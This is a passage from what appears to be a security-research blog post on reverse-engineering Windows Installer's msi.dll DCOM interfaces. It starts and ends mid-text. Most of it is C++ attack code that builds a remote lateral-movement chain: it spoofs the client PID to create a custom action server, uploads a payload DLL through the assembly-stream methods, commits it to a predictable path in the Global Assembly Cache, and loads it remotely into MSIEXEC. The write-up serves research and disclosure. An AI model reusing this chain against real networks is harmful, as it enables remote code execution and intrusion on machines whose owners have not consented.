PrepareDLLCustomAction(ushort const *,ushort const *,ushort const *,ulong,uchar,uchar,_GUID const *,_GUID const *,ulong *)=0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT RunDLLCustomAction(ulong,ulong *) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT FinishDLLCustomAction(ulong) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT RunScriptAction(int,IDispatch *,ushort const *,ushort const *,ushort,int *,int *,char * *) = 0;<br bold="[object Object]"><br bold="[object Object]">    [snip]<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTAddAssemblyInstallComponent(ushort const*,ushort const*, ushort const*) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTIsAssemblyInstalled(ushort const*, ushort const*, int*, int*, char**) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTProvideGlobalAssembly(ushort const*, ulong, ulong*) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTCommitAssemblies(ushort const*, int*, char**) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTUninstallAssembly(ushort const*, ushort const*, int*, char**) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTGetAssemblyCacheItem(ushort const*, ushort const*, ulong, int*, char**) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTCreateAssemblyFileStream(ushort const*, int) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTWriteAssemblyBits(char *,ulong,ulong *) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT URTCommitAssemblyStream() = 0;<br bold="[object Object]"><br bold="[object Object]">    [snip]<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT LoadEmbeddedDLL(ushort const*, uchar) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT CallInitDLL(ulong,ushort const *,ulong *,ulong *) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT CallMessageDLL(UINT, ulong, ulong*) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT CallShutdownDLL(ulong*) = 0;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp; virtual HRESULT UnloadEmbeddedDLL() = 0;<br bold="[object Object]"><br bold="[object Object]">    [snip]<br bold="[object Object]"><br bold="[object Object]">};</pre><p></p><p>With names like <em>RunScriptAction</em> and <em>RunDLLCustomAction</em> it seems like <em>IMsiCustomAction</em> might be our treasure trove. But, before we open it, we have to first create it with a DCOM call to <em>IMsiServer::CreateCustomActionServer</em>. Let's build our attack client:&nbsp;</p><pre>// Code stripped from remote connection and ole setupCOSERVERINFO coserverinfo = {};<br><br>coserverinfo.pwszName = REMOTE_ADDRESS;<br><br>coserverinfo.pAuthInfo = pAuthInfo_FOR_REMOTE_ADDRESS;<br><br>CLSID CLSID_MsiServer = { 0x000c101c,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };<br><br>IID IID_IMsiServer = CLSID_MsiServer;<br><br>MULTI_QI qi ={};<br><br>qi.pIID = &amp;IID_IMsiServer; // the interface we aim to get<br><br>HRESULT hr = CoCreateInstanceEx(CLSID_MsiServer, NULL, CLSCTX_REMOTE_SERVER, &amp;coserverinfo, 1, &amp;qi) ;<br><br>IMsiServer* pIMsiServerObj = qi.pItf;</pre><p></p><p>At this point <em>pIMsiServerObj</em> points to our client <em>IMsiServer</em> interface. Now we need to create the correct arguments for <em>IMsiServer::CreateCustomActionServer</em>&nbsp;</p><p>Notable arguments:<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><ol><li><p><em>dwProcessId</em> is expected to contain the client PID and is treated as a local PID on the server side. If we provide our true client PID, the server side will fail to find it on the remote target and the call will fail. We can trick this check and set <em>dwProcessId</em>=4, pointing to the always-existing <em>System</em> process&nbsp;</p></li><li><p><em>PiRemoteAPI</em>, which should point to an <em>IMsiRemoteAPI</em> instance, is the trickiest to initialize. Searching through symbols from msi.dll gives us the IID of that interface&nbsp;</p></li></ol><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltdfc41e799b93eb16" alt="fig-10-IDA- symbols-for- IID_IMsiRemoteAPI.png" src="https://www.deepinstinct.com/image/bltdfc41e799b93eb16/6757642e9628e10d351e3eb2/fig-10-IDA-_symbols-for-_IID_IMsiRemoteAPI.png" height="auto"><figcaption style="text-align:center">Figure 10: IDA symbols for IID_IMsiRemoteAPI&nbsp;</figcaption></div></figure><p></p><pre>IID IID_IMsiRemoteApi <strong>=</strong> <strong>{</strong> 0x000c1033<strong>,</strong>0x0000<strong>,</strong>0x0000<strong>,{</strong>0xc0<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x46<strong>}</strong> <strong>};</strong></pre><p></p><p>However, because <em>CLSID_MSISERVER</em> does not implement <em>IID_IMsiRemoteApi</em>, we can't directly create it with a call to:&nbsp;</p><pre>HRESULT hr <strong>=</strong> CoCreateInstance<strong>(</strong>CLSID_MSISERVER<strong>,</strong> <strong>NULL,</strong> CLSCTX_INPROC_SERVER<strong>,</strong> IID_IMsiRemoteApi <strong>,&amp;</strong>piRemoteAPI<strong>)</strong> <strong>;</strong></pre><p><strong></strong></p><h5>Discovering An Implementing CLSID</h5><p></p><p>Heads up: this section covers a technical reverse-engineering process. We will demonstrate how to correctly invoke <em>IMsiServer::CreateCustomActionServer</em>. If you're not interested in the detailed drill-down, feel free to skip to “<strong>The Secured Actions.</strong>”&nbsp;&nbsp;</p><p>To create an instance of <em>IMsiRemoteApi</em> we need to find the <em>CLSID</em> of the class that implements it. We’ll start by searching for a symbol named <em>CLSID_MsiRemoteApi</em> in msi.dll. However, this time no results are returned:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltd1837a9d41309111" alt="fig-11-no-results-CLSID_MsiRemoteApi.png" src="https://www.deepinstinct.com/image/bltd1837a9d41309111/6757643f4657c8dce3d1c9d7/fig-11-no-results-CLSID_MsiRemoteApi.png" height="auto"><figcaption style="text-align:center">Figure 11: No results searching CLSID_MsiRemoteApi</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><p>We are left trying to trace where <em>IID_IMsiRemoteApi</em> is created within msi.dll, using cross-references:&nbsp;</p><ul><li><p>Cross-referencing <em>IID_IMsiRemoteApi,</em> we find <em>CMsiRemoteAPI::QueryInterface</em>, which is part of the<em> IMsiRemoteApi</em> interface&nbsp;</p></li></ul><ul><li><p>Searching <em>CMsiRemoteAPI::QueryInterface</em> leads to <em>IMsiRemoteApi</em>’s vtable in the .rdata section, which is marked with a symbol named <em>??_7CMsiRemoteAPI@@6B@:&nbsp;</em></p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltdd54d3bfb99771d1" alt="fig-12-CMsiRemoteApiVtable.png" src="https://www.deepinstinct.com/image/bltdd54d3bfb99771d1/6757643f4e76752949eee8f0/fig-12-CMsiRemoteApiVtable.png" height="auto"><figcaption style="text-align:center">Figure 12: CMsiRemoteAPI::`vftable'&nbsp;</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><ul><li><p>Searching <em>??_7CMsiRemoteAPI@@6B@</em> leads to <em>CMsiRemoteAPI::CMsiRemoteAPI,</em> which is the constructor for <em>IMsiRemoteApi </em>instances&nbsp;</p></li></ul><ul><li><p>Searching the constructor leads to <em>CreateMsiRemoteAPI</em>, a factory method that invokes it&nbsp;</p></li></ul><ul><li><p>Searching the factory method shows it’s the <strong>9th</strong> element in an array of factory methods named <em>rgFactory</em>, which are located in the .rdata section:&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt57e5ad117bf111a8" alt="fig-13-rgFactory .png" src="https://www.deepinstinct.com/image/blt57e5ad117bf111a8/6757643f6801016d5756a3cf/fig-13-rgFactory_.png" height="auto"><figcaption style="text-align:center">Figure 13: rgFactory&nbsp;</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><ul><li><p>Searching usages of <em>rgFactory</em> shows it's used in <em>CModuleFactory::CreateInstance</em>:&nbsp;&nbsp;</p></li></ul><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltc005f71bf62c0ea4" alt="fig-14-CModuleFactory-CreateInstance.png" src="https://www.deepinstinct.com/image/bltc005f71bf62c0ea4/6757643f8a58e9e5bef0fe94/fig-14-CModuleFactory-CreateInstance.png" height="auto"><figcaption style="text-align:center">Figure 14: CModuleFactory::CreateInstance’s reversed pseudo code&nbsp;</figcaption></div></figure><p></p><p>We can see that<em> CModuleFactory::CreateInstance</em> pulls a method from <em>rgFactory</em> at an index and invokes it to create an object and return it with <em>outObject</em>.&nbsp;</p><p>This will happen if, at the same <em>index</em>, a GUID pulled from <em>rgCLSID</em> (green line in the snippet) is equal to the input argument <em>_GUID *inCLSID</em>.&nbsp;</p><p><em>rgCLSID</em> is a global variable that points to a CLSID array in the .rdata section</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt4167fb3b592b48ef" alt="fig-15-rgCLSID.png" src="https://www.deepinstinct.com/image/blt4167fb3b592b48ef/6757643ffc312adb815699f7/fig-15-rgCLSID.png" height="auto"><figcaption style="text-align:center">Figure 15: rgCLSID snipped&nbsp;</figcaption></div></figure><p>&nbsp;</p><p>The 9th element in this array, which will cause invocation of <em>CreateMsiRemoteAPI</em> (the 9th member of <em>rgFactory</em>), is the CLSID:&nbsp;</p><pre>CLSID CLSID_MsiRemoteApi <strong>=</strong> <strong>{</strong> 0x000c1035<strong>,</strong>0x0000<strong>,</strong>0x0000<strong>,{</strong>0xc0<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x00<strong>,</strong>0x46<strong>}</strong> <strong>};</strong></pre><p><span style="color:rgb(209, 52, 56)"></span></p><p>This means that if <em>CModuleFactory::CreateInstance</em> is invoked with a <em>CLSID_MsiRemoteApi</em>, it will create our desired instance of <em>IMsiRemoteAPI* piRemoteAPI</em>.&nbsp;</p><p>We are now left with a task to invoke <em>CModuleFactory::CreateInstance</em> from our client code.&nbsp;</p><p></p><h5>IClassFactory</h5><p></p><p>While <em>CModuleFactory::CreateInstance</em> is not a public export, cross-referencing it leads to <em>CModuleFactory</em>'s vtable:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt2c4d80b68237fe56" alt="fig-16-CModuleFactory-Vtable.png" src="https://www.deepinstinct.com/image/blt2c4d80b68237fe56/6757643f68010125b656a3d3/fig-16-CModuleFactory-Vtable.png" height="auto"><figcaption style="text-align:center">Figure 16: CModuleFactory's vtable</figcaption></div></figure><p></p><p>The first method in the vtable is a <em>QueryInterface</em> implementation, which means <em>CModuleFactory</em> is an interface implementation. The next two Nullsubs are empty implementations of <em>IUnkown::AddRef</em> &amp; <em>IUnkown::Release</em>, and the next two methods are:&nbsp;</p><ul><li><p><em>CreateInstance</em> (which we reversed)&nbsp;</p></li></ul><ul><li><p><em>LockServer</em>&nbsp;</p></li></ul><p>Searching those methods in <a href="https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory" target="_blank" rel="noopener"><u>MSDN</u></a> reveals <em>IClassFactory</em>, an interface that defines a factory design pattern for COM object creation in implementing DLLs. The functionality of this interface is accessed through a method called <em>DllGetClassObject</em>, which is exported by the implementing DLLs, including <em>msi.dll.</em></p><p>This is how we invoke <em>msi.dll!DllGetClassObject</em> to create our target <em>IMsiRemoteAPI* piRemoteAPI</em>:&nbsp;</p><pre>// code stripped from error handling<br><br><strong>typedef</strong> HRESULT(*DllGetClassObjectFunc)(<br><br>&nbsp;&nbsp;&nbsp; REFCLSID rclsid,<br><br>&nbsp;&nbsp;&nbsp; REFIID&nbsp;&nbsp; riid,<br><br>&nbsp;&nbsp;&nbsp; LPVOID* ppv<br><br>);<br><br>// we dont need the definition of IMsiRemoteApi if we just want to instantiate it&nbsp;&nbsp;<br><br>typedef IUnknown IMsiRemoteApi;&nbsp;<br><br>HMODULE hmsi = LoadLibraryA("msi.dll");<br><br>IClassFactory* pfact;<br><br>IUnknown* punkRemoteApi;<br><br>IMsiRemoteApi* piRemoteAPI;<br><br>DllGetClassObjectFunc DllGetClassObject = (DllGetClassObjectFunc)GetProcAddress(hdll, "DllGetClassObject");<br><br>// creating the CLSID_MsiRemoteApi class<br><br>HRESULT hr = DllGetClassObject(CLSID_MsiRemoteApi, IID_IClassFactory, (PVOID*)&amp;pfact);<br><br>// piRemoteAPI initilized to IMsiRemoteApi*<br><br>hr = pfact-&gt;CreateInstance(NULL, CLSID_MsiRemoteApi, (PVOID*)&amp;punkMsiRemoteApi);<br><br>hr = punkMsiRemoteApi-&gt;QueryInterface(IID_IMsiRemoteApi, reinterpret_cast&lt;void**&gt;(piRemoteAPI));</pre><p></p><p>We can now invoke <em>IMsiServer::CreateCustomActionServer</em> to create the target <em>IMsiCustomAction** piCustomAction</em> instance:&nbsp;</p><pre>IMsiRemoteAPI<strong>*</strong> pRemApi <strong>=</strong> // created above;<br><br>const int cookieSize = 16; // a constant size CreateCustomActionServer anticipates<br><br>icacCustomActionContext icacContext = icac64Impersonated; // an enum value<br><br>const unsigned long fakeRemoteClientPid = 4;<br><br>unsigned long outServerPid = 0;<br><br>IMsiCustomAction* pMsiAction = <strong>nullptr</strong>; // CreateCustomActionServer's output<br><br>int iRemoteAPICookieSize = cookieSize;<br><br>char rgchCookie[cookieSize];<br><br>WCHAR* pvEnvironment = GetEnvironmentStringsW();<br><br>DWORD cEnv = GetEnvironmentSizeW(pvEnvironment);<br><br>HRESULT msiresult =&nbsp; pIMsiServerObj-&gt;CreateCustomActionServer(icacContext, fakeRemoteClientPid, pRemApi, pvEnvironment, cEnv, 0, rgchCookie, &amp;iRemoteAPICookieSize, &amp;pMsiAction,&amp;outServerPid,0, 0);</pre><p><strong></strong></p><h5>The Secured Actions</h5><p></p><p>Our newly created <em>IMsiCustomAction* pMsiAction</em> allows us to run “custom actions” from a remote MSIEXEC.EXE process, and now our focus is finding a method from <em>IMsiCustomAction</em> that can execute code – giving us a new lateral movement technique.&nbsp;<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>As we have seen before, <em>IMsiCustomAction</em> contains a couple of promising function names like <em>RunScriptAction</em> and <em>RunDLLCustomAction</em>&nbsp;</p><p>Reversing these functions shows that they allow loading and running an export from a DLL of our liking or executing in-memory custom script contents (VBS or JS)! Seems too good to be true? It is.&nbsp;</p><p>Windows prevents this functionality from being invoked in a remote DCOM context, with a simple check at the start of these functions:&nbsp;</p><pre><strong>if(</strong>RPCRT4<strong>::</strong>I_RpcBindingInqLocalClientPID<strong>(</strong>0<strong>,</strong> <strong>&amp;</strong>OutLocalClientPid<strong>)&amp;&amp;<br bold="[object Object]">&nbsp; <br bold="[object Object]">  </strong>OutLocalClientPid != RegisteredLocalClientPid<strong>)<br bold="[object Object]"><br bold="[object Object]">{<br bold="[object Object]"><br bold="[object Object]">return </strong>ERROR_ACCESS_DENIED;<strong><br bold="[object Object]"><br bold="[object Object]">}</strong></pre><p></p><p>It turns out <em>I_RpcBindingInqLocalClientPID</em> fails when a client is remote (during a DCOM session), and we are blocked.&nbsp;</p><p>We need to look for functions where this security check does not exist.</p><p></p><h5><strong>Unsecured Load Primitive</strong>&nbsp;</h5><p></p><p>We will now focus our search on unsecured <em>IMsiCustomAction</em> methods by cross-referencing usages of<em> I_RpcBindingInqLocalClientPID</em> and exploring functions of <em>IMsiCustomAction</em> that don’t use it.&nbsp;</p><p>The next function that meets this criterion is <em>IMsiCustomAction::LoadEmbeddedDll(wchar_t const* dllPath, bool debug)</em>;.&nbsp;&nbsp;</p><p>Reversing this function reveals:&nbsp;</p><ol><li><p><em>LoadEmbeddedDLL</em> invokes <em>Loadlibrary</em> on the <em>dllPath</em> parameter and saves its handle.&nbsp;</p></li><li><p>Attempts to resolve three exports from <em>dllPath</em> and saves their address.&nbsp;</p><ol><li><p><em>InitializeEmbeddedUI&nbsp;</em></p></li><li><p><em>ShutdownEmbeddedUI&nbsp;</em></p></li><li><p><em>EmbeddedUIHandler&nbsp;</em></p></li></ol></li><li><p><em>LoadEmbeddedDLL</em> will not fail on non-existing exports&nbsp;</p></li></ol><p>Testing confirms that we have a remote load primitive on every DLL on the remote system!&nbsp;</p><pre>&nbsp;// Loads any DLL path into the remote MSIEXEC.exe instance hosting pMsiAction</pre><pre>pMsiAction<strong>-&gt;</strong>LoadEmbeddedDLL<strong>(</strong>L"C:\Windows\System32\wininet.dll"<strong>,false);</strong></pre><p></p><p>Is this enough for lateral movement? Not on its own. Simply loading a benign pre-existing DLL from the target system’s HD does not give us control over the code the DLL runs at load time.&nbsp;&nbsp;</p><p>However, if we could remotely write a DLL to the machine and provide its path to <em>LoadEmbeddedDLL</em> we would find a full attack.&nbsp;</p><p><a href="https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/" target="_blank" rel="noopener"><u>Some attacks</u></a> delegate responsibility after finding such a primitive and suggest separately writing a payload to the machine with SMB access. However, this type of access is very noisy, and usually blocked.&nbsp;</p><p>Using <em>IMsiCustomAction</em> I aim to find a self-sufficient write primitive to the remote machine’s HD.&nbsp;</p><p></p><h5>A Remote Write Primitive</h5><p></p><p>A combination of function names in the <em>IMsiCustomAction</em> interface leads me to believe a remote write primitive is possible:&nbsp;</p><ul><li><p><em>IMsiCustomAction::URTCreateAssemblyFileStream&nbsp;</em></p></li></ul><ul><li><p><em>IMsiCustomAction::URTWriteAssemblyBits&nbsp;</em></p></li></ul><p>Reversing<em> IMsiCustomAction::URTCreateAssemblyFileStream</em> shows a couple of initializing functions must run before it.&nbsp;</p><p>The following sequence will allow us to create a file stream, write to it, and commit it:</p><p>1. The below function will initialize data required for invoking the next function</p><pre>HRESULT IMsiCustomAction::URTAddAssemblyInstallComponent<strong>(<br bold="[object Object]"><br bold="[object Object]"></strong>	wchar_t const* UserDefinedGuid1,<br bold="[object Object]"><br bold="[object Object]">	wchar_t const* UserDefinedGuid2,<br bold="[object Object]"><br bold="[object Object]">	wchar_t const* UserDefinedName);</pre><p></p><p>2. The following function creates an internal instance of<em> IAssemblyCacheItem*</em>, a documented object that manages a file stream&nbsp;</p><pre>HRESULT IMsiCustomAction::URTGetAssemblyCacheItem<strong>(<br bold="[object Object]"><br bold="[object Object]"></strong>	wchar_t const* UserDefinedGuid1,<br bold="[object Object]"><br bold="[object Object]">	wchar_t const* UserDefinedGuid2,<br bold="[object Object]"><br bold="[object Object]">	ulong zeroed,<br bold="[object Object]"><br bold="[object Object]">	int* pInt,<br bold="[object Object]"><br bold="[object Object]">	char** pStr);</pre><p></p><p>3. &nbsp;Then <em>URTCreateAssemblyFileStream</em> invokes <em>IAssemblyCacheItem::CreateStream</em> and creates an instance of <em>IStream*</em> with the parameters provided above. The future file’s name will be <em>FileName</em>. It will save the <em>IStream*</em> to an internal variable.&nbsp;</p><pre>HRESULT IMsiCustomAction::URTCreateAssemblyFileStream<strong>(<br bold="[object Object]">	</strong>wchar_t const* FileName,<br bold="[object Object]"><br bold="[object Object]">	int Format);</pre><p></p><p>4. The function below invokes <em>IStream::Write</em> to write the number of bytes specified in <em>ulong cb</em> from <em>const char* pv</em> to the file stream and returns the number of bytes written in <em>pcbWritten</em>.&nbsp;</p><pre>HRESULT IMsiCustomAction::URTWriteAssemblyBits<strong>(<br bold="[object Object]"><br bold="[object Object]"></strong>	const char* pv,<br bold="[object Object]"><br bold="[object Object]">	ulong cb, ulong* pcbWritten);</pre><p></p><p>5. Finally, the following function commits the Stream contents to a new file, using <em>IStream::Commit</em>.&nbsp;</p><pre>&nbsp;HRESULT IMsiCustomAction::URTCommitAssemblyStream<strong>();</strong></pre><p></p><p>We’ll prepare a dummy <em>payload.dll</em>, and upload it to the target machine with the prior function sequence:&nbsp;</p><pre>char<strong>*</strong> outc <strong>=</strong> <strong>nullptr;<br bold="[object Object]"><br bold="[object Object]"></strong>int outi <strong>=</strong> 0<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>LPCWSTR mocGuid1 <strong>=</strong> L"{13333337-1337-1337-1337-133333333337}"<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>LPCWSTR mocGuid2 <strong>=</strong> L"{13333338-1338-1338-1338-133333333338}"<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>LPCWSTR asmName <strong>=</strong> L"payload.dll"<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>LPCWSTR assmblyPath <strong>=</strong> L"c:\local\path\to\your\payload.dll"<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>hr <strong>=</strong> pMsiAction<strong>-&gt;</strong>URTAddAssemblyInstallComponent<strong>(</strong>mocGuid1<strong>,</strong> mocGuid2<strong>,</strong> asmName<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>hr <strong>=</strong> pMsiAction<strong>-&gt;</strong>URTGetAssemblyCacheItem<strong>(</strong>mocGuid1<strong>,</strong> mocGuid2<strong>,</strong> 0<strong>,&amp;</strong>outi <strong>,&amp;</strong>outc<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>hr <strong>=</strong> pMsiAction<strong>-&gt;</strong>URTCreateAssemblyFileStream<strong>(</strong>assmblyPath<strong>,</strong> STREAM_FORMAT_COMPLIB_MANIFEST<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>HANDLE hAsm <strong>=</strong> CreateFileW<strong>(</strong>assmblyPath<strong>,</strong> GENERIC_READ<strong>,</strong> 0<strong>,</strong> <strong>NULL,</strong> OPEN_EXISTING<strong>,</strong> FILE_ATTRIBUTE_NORMAL<strong>,</strong> <strong>NULL);<br bold="[object Object]"><br bold="[object Object]"></strong>DWORD asmSize<strong>,</strong> sizeRead<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>GetFileSize<strong>(</strong>hAsm<strong>,</strong> <strong>NULL);<br bold="[object Object]"><br bold="[object Object]"></strong>char<strong>*</strong> content <strong>=</strong> <strong>new</strong> char<strong>[</strong>asmSize<strong>];<br bold="[object Object]"><br bold="[object Object]"></strong>readStatus <strong>=</strong> ReadEntireFile<strong>(</strong>hAsm<strong>,</strong> asmSize<strong>,</strong> <strong>&amp;</strong>sizeRead<strong>,</strong> content<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>ulong written <strong>=</strong> 0<strong>;<br bold="[object Object]"><br bold="[object Object]"></strong>hr <strong>=</strong> pMsiAction<strong>-&gt;</strong>URTWriteAssemblyBits<strong>(</strong>content<strong>,</strong> asmSize<strong>,</strong> <strong>&amp;</strong>written<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>hr <strong>=</strong> pMsiAction<strong>-&gt;</strong>URTCommitAssemblyStream<strong>();</strong></pre><p></p><p>The entire sequence succeeds; however, we get no indication of where <em>payload.dll </em>was written.&nbsp;</p><p>Searching the remote machine for a file named <em>payload.dll</em> reveals its path:&nbsp;&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltd48b71e0134473d1" alt="fig-17-Searching-the-payload .png" src="https://www.deepinstinct.com/image/bltd48b71e0134473d1/6757643f117e7eb6844693a4/fig-17-Searching-the-payload_.png" height="auto"><figcaption style="text-align:center">Figure 17: Searching the payload.dll file on the target&nbsp;</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p><p>Re-running our code generates <em>payload.dll</em> in a similar path:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="bltd7722206d15d00f1" alt="fig-18-Searching-the-payload2.png" src="https://www.deepinstinct.com/image/bltd7722206d15d00f1/6757643fa3d521f0b651c30c/fig-18-Searching-the-payload2.png" height="auto"><figcaption style="text-align:center">Figure 18: Searching payload.dll after a re-run&nbsp;</figcaption></div></figure><p></p><p>The format of those paths is <em>C:\assembly\tmp\[RANDOM_8_LETTERS]\payload.dll</em>. Since <em>RANDOM_8_LETTERS</em> cannot be predicted we can't just follow up with a call to our load primitive <em>IMsiCustomAction::LoadEmbeddedDll</em> on the said path.&nbsp;</p><p>We need to find a way to put our <em>payload.dll</em> in a predictable path, and <em>IMsiCustomAction</em> hooks us up yet again&nbsp;</p><p></p><h5>Controlling The Path</h5><p></p><p>The next method we reverse is <em>IMsiCustomAction::URTCommitAssemblies</em> and we find out it uses the documented function <em>IAssemblyCacheItem::Commit</em> on the stream:&nbsp;</p><p>This function installs a .NET assembly to the Global Assembly Cache (GAC), under a predictable path within <em>C:\Windows\Microsoft.NET\assembly\GAC*</em>. This makes using <em>IMsiCustomAction::URTCommitAssemblies</em> our new goal.&nbsp;</p><p>Assemblies stored in the GAC must be identified with a strong name <span style="color:rgb(0, 0, 0)">–</span> a signature created with a public-private key pair that ensures the uniqueness of the assembly.&nbsp;</p><p>Considering this, with our goal to successfully use <em>URTCommitAssemblies</em> and plant our payload in a predictable path, we will change payload.dll to a .NET assembly DLL with a strong name:&nbsp;</p><pre>// example x64 dummy POC for .NET payload.dll<br><br>// a strong name should be set for the dll in the VS compilation settings<br><br><strong>namespace</strong> payload<br><br>{<br><br>&nbsp;&nbsp;&nbsp; public class Class1<br><br>    {<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void DummyNotDLLMain()<br><br>        {<br><br>        }<br><br>    }<br><br>}</pre><p><strong></strong></p><p>We update our code to use <em>IMsiCustomAction::URTCommitAssemblies</em> on the new payload and re-run it:&nbsp;</p><pre>HRESULT URTCommitAssemblies<strong>(</strong>wchar_t const<strong>*</strong> UserDefinedGuid1<strong>,</strong> int<strong>*</strong> pInt<strong>,</strong> char<strong>**</strong> pStr<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>int outIntCommit = 0;<strong><br bold="[object Object]"><br bold="[object Object]"></strong>char* outCharCommit =<strong> nullptr;<br bold="[object Object]"><br bold="[object Object]"></strong>// mocGuid1 is the same GUID we created for invoking URTAddAssemblyInstallComponent<strong><br bold="[object Object]"><br bold="[object Object]"></strong>hr = pMsiAction-&gt;URTCommitAssemblies(mocGuid1, <strong>&amp;</strong>outIntCommit, <strong>&amp;</strong>outCharCommit);</pre><p></p><p><em>Payload.dll</em> is now uploaded to:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt88d568668b167da3" alt="fig-19-payload-in-GAC-folder.png" src="https://www.deepinstinct.com/image/blt88d568668b167da3/6757643fbbb2f6cc0e399940/fig-19-payload-in-GAC-folder.png" width="auto" height="auto"><figcaption style="text-align:center">Figure 19: payload.dll uploaded to the GAC folder after URTCommitAssemblies</figcaption></div></figure><p></p><p>Analyzing each token on this path with accordance to <em>payload.dll</em>’s strong name details, we derive the GAC path structure for installed assemblies (valid for .NET version =&gt; 4):&nbsp;</p><p><em>C:\Windows\Microsoft.NET\assembly\GAC_[assembly_bitness]\[assembly_name]\v4.0_[assembly_version]__[public_key_token]\[assembly_name].dll&nbsp;</em></p><p>Getting those details from a strong-named DLL can be done using <em>sigcheck.exe </em>(Sysinternals) and <a href="https://learn.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool" target="_blank" rel="noopener"><u>sn.exe</u></a> (.NET Framework tools)&nbsp;</p><p>We have managed to install an assembly DLL to a predictable path in the GAC and figure out the path structure. Let's now incorporate our efforts into the attack:&nbsp;</p><pre>// resuming from our last code snippets<br><br>// our payload is the dummy .NET payload.dll<br><br>// URTCommitAssemblies commits payload.dll to the GAC<br><br>hr = pMsiAction-&gt;URTCommitAssemblies(mocGuid1, &amp;outIntCommit, &amp;outCharCommit);<br><br><br>std::wstring payload_bitness = L"64"; // our payload is x64<br><br>std::wstring payload_version = L"1.0.0.0"; // sigcheck.exe -n payload.dll<br><br>std::wstring payload_assembly_name = L"payload";<br><br>std::wstring public_key_token = L"136e5fbf23bb401e"; // sn.exe -T payload.dll<br><br><br>// forging all elements to the GAC path<br><br>std::wstring payload_gac_path = std::format(L"C:\\Windows\\Microsoft.NET\\assembly\\GAC_{0}\\{1}\\v4.0_{2}__{3}\\{1}.dll", payload_bitness, payload_assembly_name, payload_version,public_key_token);<br><br>hr = pMsiAction-&gt;LoadEmbeddedDLL(payload_gac_path.c_str(), 0);</pre><p></p><p>The updated attack code runs successfully, and to confirm our payload was loaded to the remote MSIEXEC.exe we break into it in Windbg and query:</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blte4d3004314bd577c" alt="fig-20-windbg-confirms-payload-in-GAC.png" src="https://www.deepinstinct.com/image/blte4d3004314bd577c/6757643fa3d521813151c30a/fig-20-windbg-confirms-payload-in-GAC.png" height="auto"><figcaption style="text-align:center">Figure 20: Windbg confirms payload.dll is loaded from the GAC</figcaption></div></figure><p></p><p>Success! But we’re not quite done yet, as .NET assemblies do not have “DllMain” functionality on native processes<span style="color:rgb(209, 52, 56)">,</span> so no code is running. There are a couple of possible 